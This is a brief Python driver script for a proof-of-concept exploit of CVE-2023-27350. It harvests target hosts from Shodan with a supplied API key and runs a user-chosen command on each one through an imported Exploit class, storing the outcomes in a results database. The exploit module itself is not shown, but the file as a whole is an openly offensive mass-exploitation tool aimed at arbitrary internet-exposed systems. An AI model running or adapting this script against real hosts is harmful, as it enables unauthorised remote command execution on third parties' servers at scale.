import argparse
from exploit import Exploit
from shodan_search import ShodanSearch
from database import Database

def main():
    parser = argparse.ArgumentParser(description='PoC for CVE-2023-27350')
    parser.add_argument('command', help='Command to execute')
    parser.add_argument('--shodan', help='Shodan API key')
    args = parser.parse_args()

    db = Database('results.db')
    targets = []

    if args.shodan:
        shodan_search = ShodanSearch(api_key=args.shodan)
        targets = shodan_search.search()

    for target in targets:
        exploit = Exploit(url=target, command=args.command)
        exploit.run(db)

    db.close()

if __name__ == "__main__":
    main()
